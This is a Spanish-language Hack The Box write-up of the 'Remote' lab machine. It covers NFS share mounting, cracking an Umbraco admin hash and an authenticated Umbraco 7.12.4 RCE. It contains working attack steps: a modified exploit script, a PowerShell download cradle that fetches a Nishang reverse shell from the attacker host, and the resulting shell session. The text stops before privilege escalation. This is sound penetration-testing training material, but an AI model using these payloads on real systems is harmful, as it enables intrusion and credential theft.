---
title: "Remote - Hack The Box"
date: 2023-01-25
draft: false
slug: "htb-writeup-remote"
excerpt: "Esta máquina es algo difícil, pues hay que investigar todos los servicios que usa y ver de cual nos podemos aprovechar para poder vulnerar los sistemas de la máquina, además de analizar los Exploits, estos se deben configurar correctamente para su uso. Nos aprovechamos del servicio NSF para poder crear una montura y así obtener la contraseña para entrar al servicio Umbraco, una vez dentro encontramos que el Umbraco usa la versión 7.12.4 que es vulnerable a ejecución remota de comandos, por lo que cargamos una Reverse Shell que nos conecta a la máquina usando un Exploit de esta versión de Umbraco. Dentro logramos escalar privilegios de varias formas como explotando el servicio TeamViewer, cambiando el servicio UsoSvc, usando Juicy Potato y con un módulo de Metasploit."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Windows", "FTP Enumeration", "Umbraco", "Remote Code Execution - Authenticated (RCE - Authenticated)", "NFS Pentesting", "Cracking Hash", "Reverse Shell", "TeamViewer Enumeration & Exploitation", "CVE-2019-18988", "Privesc - TeamViewer Enumeration & Exploitation (CVE-2019-18988)", "Privesc - Abusing UsoSvc", "Privesc - Juicy Potato", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "ftp"
  - "smbclient"
  - "showmount"
  - "mountd"
  - "hashid"
  - "hash-identifier"
  - "JohnTheRipper"
  - "tcpdump"
  - "nc"
  - "rlwrap"
  - "msfvenom"
  - "certutil.exe"
  - "iwr"
  - "metasploit framework(msfconsole)"
  - "Módulo: exploit/multi/script/web_delivery"
  - "Módulo: post/windows/gather/credentials/teamviewer_passwords"
  - "meterpreter"
links:
  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind"
  - "https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data"
  - "https://hashes.com/es/decrypt/hash"
  - "https://vk9-sec.com/umbraco-cms-7-12-4-authenticated-remote-code-execution/"
  - "https://github.com/samratashok/nishang"
  - "https://github.com/mr-r3b00t/CVE-2019-18988/blob/master/manual_exploit.bat"
  - "https://whynotsecurity.com/blog/teamviewer/"
  - "https://kalilinuxtutorials.com/decryptteamviewer/"
  - "https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0"
  - "https://bobbyhadz.com/blog/python-no-module-named-crypto"
  - "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services"
  - "https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505"
  - "https://github.com/carlospolop/PEASS-ng/releases/tag/20240324-2c3cd766"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-remote/remote_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a hacer un ping y analicemos el TTL para saber que SO utiliza la máquina:
```bash
ping -c 4 10.10.10.180                
PING 10.10.10.180 (10.10.10.180) 56(84) bytes of data.
64 bytes from 10.10.10.180: icmp_seq=1 ttl=127 time=129 ms
64 bytes from 10.10.10.180: icmp_seq=2 ttl=127 time=130 ms
64 bytes from 10.10.10.180: icmp_seq=3 ttl=127 time=134 ms
64 bytes from 10.10.10.180: icmp_seq=4 ttl=127 time=131 ms

--- 10.10.10.180 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3011ms
rtt min/avg/max/mdev = 128.920/130.771/134.012/1.957 ms
```
Con el TTL ya sabemos que es una máquina tipo Windows, realicemos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.180             
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-25 15:54 CST
Initiating SYN Stealth Scan at 15:54
Scanning 10.10.10.180 [65535 ports]
Discovered open port 139/tcp on 10.10.10.180
Discovered open port 111/tcp on 10.10.10.180
Discovered open port 80/tcp on 10.10.10.180
Discovered open port 445/tcp on 10.10.10.180
Discovered open port 21/tcp on 10.10.10.180
Discovered open port 135/tcp on 10.10.10.180
Discovered open port 49666/tcp on 10.10.10.180
Discovered open port 49679/tcp on 10.10.10.180
Discovered open port 5985/tcp on 10.10.10.180
Discovered open port 2049/tcp on 10.10.10.180
Increasing send delay for 10.10.10.180 from 0 to 5 due to max_successful_tryno increase to 4
Discovered open port 49667/tcp on 10.10.10.180
Increasing send delay for 10.10.10.180 from 5 to 10 due to max_successful_tryno increase to 5
Discovered open port 49665/tcp on 10.10.10.180
Increasing send delay for 10.10.10.180 from 10 to 20 due to max_successful_tryno increase to 6
Completed SYN Stealth Scan at 15:55, 82.41s elapsed (65535 total ports)
Nmap scan report for 10.10.10.180
Host is up, received user-set (1.7s latency).
Scanned at 2023-01-25 15:54:25 CST for 82s
Not shown: 34995 filtered tcp ports (no-response), 30528 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 127
80/tcp    open  http         syn-ack ttl 127
111/tcp   open  rpcbind      syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
2049/tcp  open  nfs          syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49679/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 82.57 seconds
           Raw packets sent: 403278 (17.744MB) | Rcvd: 30857 (1.234MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Demasiados puertos abiertos y ya vemos varios servicios conocidos como el **FTP, el HTTP y el SMB**. Pero hay algunos que no había visto, antes de investigarlos vamos a hacer un escaneo de servicios.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sC -sV -p21,80,111,135,139,445,2049,5985,49665,49666,49667,49679 10.10.10.180              
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-25 15:57 CST
Stats: 0:01:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 96.00% done; ETC: 15:58 (0:00:00 remaining)
Nmap scan report for 10.10.10.180
Host is up (0.18s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd

| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)

| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-25T21:58:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.34 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Como mencione antes, hay varios servicios que no había visto antes como el **mountd**, el **rpcbind** y el **NFS**. Es momento de investigar que son estos servicios.

### Investigación de Servicios {#Investigacion}

Primero, veamos el **servicio rpcbind**:

| **RPCBIND** |
|:-----------:|
| *El servicio rpcbind asigna los servicios de llamada a procedimiento remoto (RPC) a los puertos en los que escuchan. Los procesos RPC notifican a rpcbind cuando se inician, registrando los puertos en los que escuchan y los números de programa RPC que esperan servir.* |

Ahora, veamos que es el **demonio mountd**:

| **daemon mountd** |
|:-----------:|
| *El daemon mountd gestiona solicitudes de montaje de sistema de archivos desde sistemas remotos y proporciona control de acceso. El daemon mountd comprueba /etc/dfs/sharetab para determinar qué sistemas de archivos están disponibles para el montaje remoto y qué sistemas están autorizados a hacer el montaje remoto.* |

Y por último, veamos que es el **servicio NFS**:

| **Network File System** |
|:-----------:|
| *Network File System (NFS) es un estándar de servidor de archivos basado en el modelo cliente-servidor. El NFS permite a los usuarios ver, actualizar y almacenar archivos en un sistema remoto como si estuvieran trabajando localmente.* |

Muy bien, pues después de leer cada concepto de los servicios, deduzco que la máquina esta almacenando mucha información de una página web en producción, esto quiere decir que aquí se almacena todo lo que tenga que ver con la página web que esta activa en el **puerto 80** e incluso el escaneo de servicios nos dice que los 3 operan en conjunto. Además, está el **puerto 5985** que el escaneo nos muestra con el servicio **HTTPAPI**, vamos a investigar este último:

<p align="center">
<img src="/assets/images/htb-writeup-remote/Captura7.png">
</p>

Esta usando una **API de Microsoft**, esto ya nos da una idea de que el servicio principal a explotar, es el web.

Antes de continuar e investigar la página web que está operando, veamos si no hay algún Exploit para los 4 servicios que ya investigamos, vamos a buscar por internet primero ya que no tenemos una versión en si de todos los servicios, si lo tuviéramos seria solamente buscar un Exploit con la herramienta **Searchsploit**.

#### Buscando Vulnerabilidades para los Servicios Investigados {#Vulns}

Encontramos una página bastante interesante y que al parecer nos puede ayudar de aquí en adelante para futuras máquinas, pues te da referencias de lo que puedes hacer, lo que no puedes y de lo que necesitar para vulnerar ciertos servicios:

Página **HackTricks**:
* <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind" target="_blank">HackTricks: 111/TCP/UDP - Pentesting Portmapper</a>

Ahí incluso hay una sección que nos dice que el **servicio RPCBIND** puede ser vulnerable para cargar archivos si está activo junto al **servicio NFS**.

Esto quizá nos sirva más adelante, pero de momento vamos a investigar la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Vamos a entrar en la página web que esta activa y veamos que hay:

![](/assets/images/htb-writeup-remote/Captura1.png)

Al parecer es una tienda como de ropa, pero está incompleta. Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-remote/Captura2.png">
</p>

Utilizan algunas librerías de **JavaScript**, pero no veo algo que nos pueda servir, sigamos analizando la página web.

Hay una sección llamada **People**, quiza alguno de esos nombre sea un usuario asi que seria bueno anotarlos por si las dudas.

![](/assets/images/htb-writeup-remote/Captura3.png)

En la sección **About Us** hay algunas ideas de lo que pueden implementar en la página para mejorarla y hay una subrayada como si ya se hubiera hecho, no creo que nos sirva de mucho esto, pero hay que tomar en cuenta todo lo que encontremos.

<p align="center">
<img src="/assets/images/htb-writeup-remote/Captura4.png">
</p>

Por último, en la sección de **Contact** nos viene la opción de mandar un mensaje a **Umbraco**. Pero, ¿qué pasa si le damos click?

![](/assets/images/htb-writeup-remote/Captura5.png)

Vaya, vaya, un inicio de sesión para el **servicio Umbraco**, hay que investigar este servicio.

<p align="center">
<img src="/assets/images/htb-writeup-remote/Captura6.png">
</p>

### Investigando Servicio Umbraco {#Umbraco}

Veamos que es el **servicio Umbraco**:

| **Umbraco** |
|:-----------:|
| *Umbraco es una plataforma de gestión de contenidos open source utilizado para publicar contenido en la World Wide Web e intranets. Está desarrollado con C# y funciona sobre infraestructura Microsoft.* |

Entonces, **Umbraco** es un gestor de contenidos y para estos casos, siempre debe de haber credenciales por defecto, vamos a buscarlas:

* **One installed, the default username and password for the backoffice is "admin" and "test"**

Probamos esto y nada, no sirve, entonces de momento vamos a dejar **Umbraco** hasta que tengamos una versión pues con esto podemos buscar un Exploit que nos sirva.

### Analizando Servicios FTP y SMB {#FTPSmb}

Primero vamos con el **servicio FTP**, ya que el escaneo de servicios nos menciona que podemos conectarnos como usuario **Anonymous** entonces veamos que hay dentro:
```batch
ftp 10.10.10.180
Connected to 10.10.10.180.
220 Microsoft FTP Service
Name (10.10.10.180:berserkwings): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49702|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> ls -la
229 Entering Extended Passive Mode (|||49703|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> exit 
221 Goodbye.
```

Nos conectamos y...nada, no nos muestra nada, quizá podamos ver si se pueden subir archivos. 

Probémoslo:
```bash
whoami > test.txt
```

Creamos un **archivo txt** con el comando **whoami** para ver si se puede subir y ejecutar en el **servicio FTP**, subamos el archivo:
```batch
ftp 10.10.10.180 
Connected to 10.10.10.180.
220 Microsoft FTP Service
Name (10.10.10.180:berserkwings): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||49704|)
550 Access is denied. 
ftp> exit
221 Goodbye.
```

Nada, no tenemos permisos. Ahora, veamos el **servicio SMB**, aunque no creo que podamos hacer mucho, ya que el escaneo no nos indicó que podamos loguearnos:
```bash
smbclient -L //10.10.10.180/ -N
session setup failed: NT_STATUS_ACCESS_DENIED
```

Nope, no pudimos meternos, entonces hay que cambiar la jugada y buscar la forma de vulnerar algún servicio. Intentemos usando la página **HackTricks**, ya que no busque nada sobre **NFS**.

### Investigando Servicio NFS {#NFS}

Truco para **HackTricks**: Si usamos la palabra **Pentesting** y luego el servicio que buscamos, nos aparecerá mejores opciones para tratar de vulnerar dicho servicio.

Buscamos por la página **HackTricks** y encontramos lo siguiente:

<p align="center">
<img src="/assets/images/htb-writeup-remote/Captura8.png">
</p>

Así que intentemos lo que nos dice, a ver que nos sale:
```bash
showmount -e 10.10.10.180      
Export list for 10.10.10.180:
/site_backups (everyone)
```

Mira nada más, cualquiera puede ver los **backups**...vamos a ver que hay ahí, pero antes, hay que preparar un directorio porque, de acuerdo a **HackTricks** podemos descargarlo:
```bash
mkdir /mnt/new_back
```

Se creo una carpeta llamada **new_back** en la carpeta **mnt** y si esta no existía pues también se crea, ahora vamos a descargar el **backup** que encontramos:
```bash
mount -t nfs 10.10.10.180:/site_backups /mnt/new_back -o nolock 
```

Al parecer todo bien, es momento de ver que hay en ese **backup**:
```bash
cd /mnt/new_back
ls
App_Browsers  App_Plugins    bin     css           Global.asax  scripts  Umbraco_Client  Web.config
App_Data      aspnet_client  Config  default.aspx  Media        Umbraco  Views
```
Se ve que hay muchos archivos y que hueva buscar en todos. Investiguemos en donde se almacena la base de datos de **Umbraco**:

Si buscamos con el navegador **"Umbraco where is database"** nos saldra una pagina del mismo **servicio Umbraco** y ahi viene varios lugares en donde se guarda:
* **/data/umbraco.config** -> De manera local, lo cual no tenemos
* **filesystem** -> No lo veo por ahi
* **/App_Data folder** -> ESA SI ESTA!!!

Como ya vimos, hay que investigar esa carpeta, pero antes, aquí el link de **Umbraco** sobre donde se almacena la BD: 
* <a href="https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data" target="_blank">Where does Umbraco store data?</a>

Ahora sí, veamos que hay en ese directorio:
```bash
ls
cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf
```

Mira, ahí esta el **umbraco.config** que también almacena parte de la BD de **Umbraco**, pero tambien esta uno con extensión **sdf**, pero primero vamos a ver el **config**.

Después de analizarlo rápidamente, no hay nada que nos pueda ayudar, salvo el nombre del creador de varios posts, que se llama **admin**, siento que o está incompleto o es un nombre por default que da **Umbraco**. Ahora veamos que es ese **sdf**.

Por cierto, los **sdf** son:

| **Archivo SDF** |
|:-----------:|
| *Los archivos SDF se utilizan para almacenar bases de datos en un formato estructurado. Se trata de una extensión de archivo estándar o genérica no asociada con ningún programa ni versión de base de datos. Por tanto, estos archivos pueden importarse y exportarse fácilmente con numerosos programas de base de datos.* |

Entonces, lo que vamos a ver será una **base de datos**, no sería bueno usar el comando **cat** para ver que hay dentro porque no creo que lo muestre bien pues serian datos más no **strings** o texto en si:
```bash
file Umbraco.sdf      
Umbraco.sdf: data
-
cat Umbraco.sdf
─────────────────────────────────────────────
       │ File: Umbraco.sdf   <BINARY>
```

Ahí está, no podremos ver el contenido porque contiene los datos en binario, entonces hay que convertirlos en **strings** para que se puedan leer y esto se hace de la sig. manera:
```bash
strings Umbraco.sdf > /Path_Donde_Quieras_Guardar_El_Output/output
```
Y ya con esto se guarda como tipo **string**, lo que nos permitirá ver con texto toda la BD.

## Explotación de Vulnerabilidades {#Explotacion}

### Analizando el Archivo SDF y Descifrando Hash {#Archivo}

Solamente usamos el comando **cat** en el output para ver que hay dentro:
```bash
cat output | head
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
@{pv
qpkaj
dAc0^A\pW
(1&a$
"q!Q
```
Mira, ya tenemos dos usuarios y tenemos un hash que supongo es una contraseña, vamos a tratar de averiguar que es ese hash.

Veamos que tipo de hash se esta utilizando, aunque claramente ya nos lo indica en el archivo, no esta de más comprobarlo. Usaremos 2 herramientas para esto: **HashID y hash-identifier**.

* Probando **HashID**:
```bash
hashid hash_admin
--File 'hash_admin'--
Analyzing 'b8be16afba8c314ad33d812f22a04991b90e2aaa'
[+] SHA-1 
[+] Double SHA-1 
[+] RIPEMD-160 
[+] Haval-160 
[+] Tiger-160 
[+] HAS-160 
[+] LinkedIn 
[+] Skein-256(160) 
[+] Skein-512(160) 
--End of file 'hash_admin'--#
```
Normalmente, el primer resultado es el que pertenece al hash, puede desplegar más resultados, pero ese es el que se toma en cuenta.

* Probando **hash-identifier**:
```bash
hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: b8be16afba8c314ad33d812f22a04991b90e2aaa
*
Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
*
Least Possible Hashs:
[+] Tiger-160
[+] Haval-160
[+] RipeMD-160
[+] SHA-1(HMAC)
```
Aquí directamente, nos dice que tipo de hash se uso, nos da otras opciones, pero siempre nos da el hash más acertado.

Ahora, usaremos la herramienta **JohnTheRipper** para descifrar el **hash**:
```bash
john -w=/usr/share/wordlists/rockyou.txt hash_admin
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 SSE2 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
baconandcheese   (?)     
1g 0:00:00:01 DONE 0.8403g/s 8255Kp/s 8255Kc/s 8255KC/s baconandchipies1..baconandcabbage
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.
```
Listo, tenemos la contraseña, aunque tambien podemos utilizar una opción de la web para descifrar el hash y obtener la contraseña:

![](/assets/images/htb-writeup-remote/Captura12.png)

Aquí el link de esta página: 
* <a href="https://hashes.com/es/decrypt/hash" target="_blank">Desencriptador de Hashes</a>

La contraseña que nos da es: **baconandcheese**

Una vez que ya tenemos la contraseña y tenemos al usuario al que le pertenece, probemos en **Umbraco** estas credenciales.

<p align="center">
<img src="/assets/images/htb-writeup-remote/Captura9.png">
</p>

Y ya estamos dentro!

<p align="center">
<img src="/assets/images/htb-writeup-remote/Captura10.png">
</p>

Ya tenemos la versión que usa **Umbraco**, ahora podemos buscar un Exploit:

<p align="center">
<img src="/assets/images/htb-writeup-remote/Captura11.png">
</p>

### Buscando y Probando Exploit {#Exploit}

Usamos **Searchsploit** para buscar el Exploit e incluso podemos buscar por internet:
```bash
searchsploit umbraco 7.12.4                                                                                    
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path

|---|---|
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                 | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                                 | aspx/webapps/49488.py

|---|---|
Shellcodes: No Results
Papers: No Results
```

#### Probando Exploit: Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution {#PruebaExp}

Vamos a usar el primero, aunque al parecer ambos son lo mismo:
```bash
searchsploit -m aspx/webapps/46153.py
  Exploit: Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution
      URL: https://www.exploit-db.com/exploits/46153
     Path: /usr/share/exploitdb/exploits/aspx/webapps/46153.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/berserkwings/Escritorio/HTB/Retired_Easy_machines/Remote/OSCP_Style/MiManera/46153.py
```

Le cambiamos el nombre:
```bash
mv 46153.py Umbraco_Exploit.py
```

Y lo analizamos de arriba hacia abajo:
```python
{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\

login = "";
password="";
host = "";
```

Como se observa, nos pide 3 datos que ya tenemos y además esta esa parte del código en donde al parecer podemos inyectar algún comando como el Exploit que usamos en la máquina **Bounty Hunter**, vamos a llenar los datos que nos pide y vamos a probar con una **Traza ICMP*** para ver si funciona el Exploit:
```python
{ string cmd = "/c ping 10.10.14.9"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd;\

login = "admin@htb.local";
password="baconandcheese";
host = "http://10.10.10.180";
```

Levantamos un servidor que acepte la **Traza ICMP** con **tcpdump**:
```bash
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Y activamos el Exploit:
```bash
python Umbraco_Exploit.py
Start
[]
End
```

Resultado:
```bash
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:59:56.827476 IP 10.10.10.180 > Tu_IP: ICMP echo request, id 1, seq 1, length 40
18:59:56.827492 IP Tu_IP > 10.10.10.180: ICMP echo reply, id 1, seq 1, length 40
18:59:57.834902 IP 10.10.10.180 > Tu_IP: ICMP echo request, id 1, seq 2, length 40
18:59:57.834914 IP Tu_IP > 10.10.10.180: ICMP echo reply, id 1, seq 2, length 40
18:59:58.851255 IP 10.10.10.180 > Tu_IP: ICMP echo request, id 1, seq 3, length 40
18:59:58.851266 IP Tu_IP > 10.10.10.180: ICMP echo reply, id 1, seq 3, length 40
18:59:59.866337 IP 10.10.10.180 > Tu_IP: ICMP echo request, id 1, seq 4, length 40
18:59:59.866347 IP Tu_IP > 10.10.10.180: ICMP echo reply, id 1, seq 4, length 40
^C
8 packets captured
8 packets received by filter
0 packets dropped by kernel
```

Esto quiere decir que, si funciona dicho Exploit, ¿pero ahora que hacemos? Bueno, investigue como usar este Exploit y justo aparece una página que explica que hacer a continuación, aqui la página: 
* <a href="https://vk9-sec.com/umbraco-cms-7-12-4-authenticated-remote-code-execution/" target="_blank">Umbraco CMS 7.12.4 – (Authenticated) Remote Code Execution</a>

Entonces vamos a crear una **Powershell Reverse Shell** para conectarnos de manera remota a la máquina que usa Umbraco, entonces vamos por pasos como indica la página:

* Descargamos el repo **Nishang** para usar la shell que necesitamos: <a href="https://github.com/samratashok/nishang" target="_blank">Repositorio de samratashok: Nishang</a>
```bash
git clone https://github.com/samratashok/nishang.git                                        
Clonando en 'nishang'...
remote: Enumerating objects: 1705, done.
remote: Counting objects: 100% (14/14), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 1705 (delta 5), reused 4 (delta 1), pack-reused 1691
Recibiendo objetos: 100% (1705/1705), 10.89 MiB | 10.43 MiB/s, listo.
Resolviendo deltas: 100% (1064/1064), listo.
```

* Copiamos el siguiente archivo que esta en el directorio **Shells**: **Invoke-PowerShellTcp.ps1**
```bash
cd nishang/shells
cp Invoke-PowerShellTcp.ps1 path_donde_quieras_que_se_guarde/.
```

* Entramos al archivo y agregamos la siguiente linea al final: `Invoke-PowerShellTcp -Reverse -IPAddress Tu_IP -Port PuertoQueQuieras`
```batch
{
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}
Invoke-PowerShellTcp -Reverse -IPAddress Tu_IP -Port PuertoQueQuieras
```

* Modificamos el Exploit para que cargue la **Reverse Shell**:
```batch
{ string cmd = "/c powershell IEX(New-Object Net.WebClient).downloadString(\'http://Tu_IP/Invoke-PowerShellTcp.ps1\')"; System.Diagnost>
 proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd;\
```

* Activamos una **netcat**:
```bash
nc -nvlp 443                                        
listening on [any] 443 ...
```

* Activamos un servidor en **Python** para que la máquina descargue el Exploit:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

* Activamos el Exploit y vemos el resultado:
```bash
nc -nvlp 443                                        
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.180] 49736
Windows PowerShell running as user REMOTE$ on REMOTE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
PS C:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
```

Incluso si vemos el servidor en **Python**, veremos cómo se descargó y está activo pues si lo quitamos, se quita todo:
```bash
python3 -m http.server 80
